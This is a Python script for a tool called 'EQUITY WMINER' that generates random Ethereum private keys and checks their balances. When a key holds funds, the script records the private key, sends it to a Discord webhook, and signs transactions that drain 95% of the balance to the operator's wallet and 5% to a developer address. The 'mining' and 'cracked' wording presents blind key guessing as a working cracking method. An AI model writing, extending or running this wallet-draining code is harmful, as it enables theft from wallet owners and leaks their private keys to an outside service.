from ast import parse
import os
import sys
import time
import json
import psutil # Needs to be installed (pip install psutil)
import secrets
import requests # (pip install requests) 
from web3 import Web3 # (pip install web3)
import multiprocessing
from datetime import datetime # (pip install datetime)
from discord_webhook import DiscordWebhook, DiscordEmbed # (pip install discord_wehook)
import argparse 
starttime = datetime.now()

def getUptime():
    return datetime.now() - starttime

def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhookurl, badhitlogging):
    global w3
    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
    global w3state
    w3state = "check"
    if w3.isConnected():
        i=0
        while i <= 1:
            key = "0x" + secrets.token_hex(32)
            amount.value = amount.value + 1
            if int(amount.value) >= int(amounttrigger.value):
                amount.value = 0
                if (webhookurl != "null"):
                    webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                    embed = DiscordEmbed(title="EQUITY WMINER | SUMMARY", color="8fce00")
                    embed.set_timestamp()
                    embed.add_embed_field(name="Bad Hits:", value=bdhits.value, inline=False)
                    embed.add_embed_field(name="Good Hits:", value=hits.value, inline=False)
                    embed.add_embed_field(name="Uptime:", value=str(getUptime()), inline=False)
                    embed.add_embed_field(name="CPU Usage:", value=str(psutil.cpu_percent(4)), inline=False)
                    webhook.add_embed(embed)
                    webhook.execute()
            try:
                if w3state == "main": 
                    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
                    w3state = "check"
                account = w3.eth.account.from_key(key)
                bal = w3.eth.get_balance(account.address)
                if bal > 2000000000000000:
                    secondtry = w3.eth.account.from_key(key)
                    secondbal = w3.eth.get_balance(secondtry.address)
                    if secondbal > 2000000000000000:
                        hits.value = hits.value + 1
                        w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
                        w3state = "main"
                        if not w3.isConnected(): w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
                        try:
                            print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
                            print('\033[32mRecording hit in "hits.txt"...\033[0m')
                            hitstxt = open("hits.txt", "a")
                            hitstxt.write("> N E W   H I T! pKey: %s - ETH: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                            hitstxt.close()
                            if (webhookurl != "null"):
                                webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                                embed = DiscordEmbed(title="EQUITY WMINER | NEW HIT", color="8fce00")
                                embed.set_timestamp()
                                embed.add_embed_field(name="pKey:", value=key, inline=False)
                                embed.add_embed_field(name="ETH:", value=str(bal*0.95/1000000000000000000), inline=False)
                                embed.add_embed_field(name="Uptime:", value=str(getUptime()), inline=False)
                                embed.add_embed_field(name="CPU Usage:", value=str(psutil.cpu_percent(4)), inline=False)
                                webhook.add_embed(embed)
                                webhook.execute()
                            print('\033[32mRecorded hit in "hits.txt". Attempting autowithdrawal...\033[0m')
                            gasdata = requests.get(json.load(open("DATA", "r"))['MAIN']["GAS_API"]).text
                            gasjson = json.loads(gasdata)
                            avgGas = int(gasjson["average"])/10
                            MineTransaction = {
                                'nonce': w3.eth.getTransactionCount(account.address),
                                'to': str(minerAddress),
                                'value': w3.toWei((bal*0.95-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                'gas': 21000,
                                'gasPrice': w3.toWei(avgGas, "gwei")
                            }
                            MineTransaction2 = {
                                'nonce': w3.eth.getTransactionCount(account.address)+1,
                                'to': str(json.load(open("DATA", "r"))['SECONDARY']["DEV"]),
                                'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                'gas': 21000,
                                'gasPrice': w3.toWei(avgGas, "gwei")
                            }
                            signedMineTX = w3.eth.account.sign_transaction(MineTransaction, key)
                            sentMineTX = w3.eth.send_raw_transaction(signedMineTX.rawTransaction)
                            print("\033[32m" + str(bal*0.95/1000000000000000000) + " ETH has been sent to your wallet. TXHash: " + "https://etherscan.io/tx/" + str(w3.toHex(sentMineTX))+ "\033[0m")
                            time.sleep(80)
                            signedMineTX2 = w3.eth.account.sign_transaction(MineTransaction2, key)
                            if w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei") > w3.toWei(avgGas, "gwei"):
                                rt = w3.eth.send_raw_transaction(signedMineTX2.rawTransaction)
                        except Exception as e:
                            print("\033[33m[WARNING!] Automatically withdrawn failed! Awaiting for manual withdraw!\033[0m")
                            print('Logged the error in "debug.txt"')
                            dbug = open("debug.txt", "a")
                            dbug.write("> Got new error in withdrawal process. Line 41-91:\n%s\n\n"%e)
                            dbug.close()
                else:
                    bdhits.value = bdhits.value + 1
                    if badhitlogging == True: print("\033[31m[BAD HIT] | " + str(account.address) + " | cracked but insufficient balance of " + str(bal/1000000000) + " ETH | Counter: " + str(bdhits.value) +"\033[0m")
                    time.sleep(0.02)
            except Exception as e:
                if badhitlogging == True: print("\033[31m[NEW ERROR] | %s | Couldn't resolve key!\033[0m"%key)
                print(e)
                chk.value = chk.value + 1
                time.sleep(0.02)
    else: return print("CHILD PROCESS ENDED | Process Reallocated | Connection Failed to Web3 RPC Node")
def NUpdate(chk,hits,bdhits):
    x = 0
    while x < 1:
        if hits.value >= 1:
            sys.stdout.write("\x1b]2;EQUITY WMINER v1.3 | MINING...GOT AN HIT! | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
        else:
            sys.stdout.write("\x1b]2;EQUITY WMINER v1.3 | MINING... | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
        time.sleep(0.02)

if __name__=="__main__":
    os.system("cls")
    print("V 1.3")
    print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
    print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
    print('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
    print('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
    print('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
    print('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
    sys.stdout.write("\x1b]2;EQUITY WMINER v1.3 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
    print('\n')
    parser = argparse.ArgumentParser(description='A equity miner')
    parser.add_argument('--wallet',type=str,help="Your ethereum address",required=True)
    parser.add_argument("--cpu",type=int,help="Cpu intensity (1-100)",required=True)
    parser.add_argument("--webhook",type=str,help="Discord webhook")
    parser.add_argument("--bhl",help="Enable bad hit logging", action='store_true')
    args = parser.parse_args()
    minerAddress = args.wallet
    if len(minerAddress) == 42:
        print("\033[32mMining address accepted!\033[0m")
        intensity = args.cpu
        if int(intensity) >= 1 and int(intensity) <= 100:
            print("\033[32mSelected %s as CPU intensity\033[0m"%str(intensity))
            if "webhook" in args:
                webhookurl = args.webhook
            else:
                webhookurl = "null"
            if args.bhl is not None and args.bhl:
                badhitbool = True
            else:
                badhitbool = False
            w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
            time.sleep(1)
            if w3.isConnected():
                print("Miner starting... [Buidling child processes...]")
                if __name__=="__main__":
                    chk = multiprocessing.Value("i", 0, lock=False)
                    hits = multiprocessing.Value("i", 0, lock=False)
                    bdhits = multiprocessing.Value("i", 0, lock=False)
                    amount = multiprocessing.Value("i", 0, lock=False)
                    amounttrigger = multiprocessing.Value("i", 1000, lock=False)
                    updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                    updP.start()
                    pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,)) for x in range(0, int(intensity)*2)]
                    time.sleep(2)
                    os.system("cls")
                    print("V 1.3")
                    print('\033[32m███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
                    print('\033[32m██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
                    print('\033[32m█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
                    print('\033[32m██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
                    print('\033[32m███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
                    print('\033[32m╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
                    print("")
                    print("\033[32mStarting mining processess..\033[0m \n")
                    if (webhookurl != "null"):
                        webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                        embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
                        embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                        embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                        embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
                        webhook.add_embed(embed)
                        webhook.execute()
                    [p.start() for p in pcs]
                    if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
                    updP.join()
                    #print("Connection to Main RPCs failed. Are you connected to Internet? Check RPCs status on Discord")
            else:
                w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
                print("\033[33mConnection to Main RPC failed! Trying to connect to Backup RPC... \033[0m")
                if w3.isConnected():
                    print("Connection migrated to Backup RPC. Miner starting... [Buidling child processes...]")
                    if __name__=="__main__":
                        chk = multiprocessing.Value("i", 0, lock=False)
                        hits = multiprocessing.Value("i", 0, lock=False)
                        bdhits = multiprocessing.Value("i", 0, lock=False)
                        amount = multiprocessing.Value("i", 0, lock=False)
                        amounttrigger = multiprocessing.Value("i", 1000, lock=False)
                        updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                        updP.start()
                        pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,)) for x in range(0, int(intensity)*2)]
                        time.sleep(2)
                        os.system("cls")
                        print("V 1.3")
                        print('\033[32m███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
                        print('\033[32m██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
                        print('\033[32m█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
                        print('\033[32m██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
                        print('\033[32m███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
                        print('\033[32m╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
                        print("")
                        print("\033[32mStarting mining processess..\033[0m \n")
                        if (webhookurl != "null"):
                            webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                            embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
                            embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                            embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                            embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
                            webhook.add_embed(embed)
                            webhook.execute()
                        [p.start() for p in pcs]
                        if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
                        updP.join()
                else:
                    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
                    if w3.isConnected():
                        print("\033[33mWarning! Main RPCs are unreachable! Starting miner without autowithdrawal!\033[0m")
                        print("Miner starting... [Buidling child processes...]")
                        time.sleep(2)
                        if __name__=="__main__":
                            chk = multiprocessing.Value("i", 0, lock=False)
                            hits = multiprocessing.Value("i", 0, lock=False)
                            bdhits = multiprocessing.Value("i", 0, lock=False)
                            amount = multiprocessing.Value("i", 0, lock=False)
                            amounttrigger = multiprocessing.Value("i", 1000, lock=False)
                            updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                            updP.start()
                            pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,)) for x in range(0, int(intensity)*2)]
                            time.sleep(2)
                            os.system("cls")
                            print("V 1.3")
                            print('\033[32m███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
                            print('\033[32m██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
                            print('\033[32m█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
                            print('\033[32m██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
                            print('\033[32m███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
                            print('\033[32m╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
                            print("")
                            print("\033[32mStarting mining processess..\033[0m \n")
                            if (webhookurl != "null"):
                                webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                                embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
                                embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                                embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                                embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
                                webhook.add_embed(embed)
                                webhook.execute()
                            [p.start() for p in pcs]
                            if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
                            updP.join()
                    else:
                        print("\033[31mConnection to Main RPCs failed. Are you connected to Internet? Check RPCs status on Discord\033[0m")
                        os.system("pause")
                        exit()
        else:
            print("Not a valid number.")
            input("\nMiner stopped. Please restart.")
            os.system("pause")
            exit()
    else:
        print("That's not a valid ETHEREUM address!")
        input("\nMiner stopped. Please restart.")
        os.system("pause")
        exit()
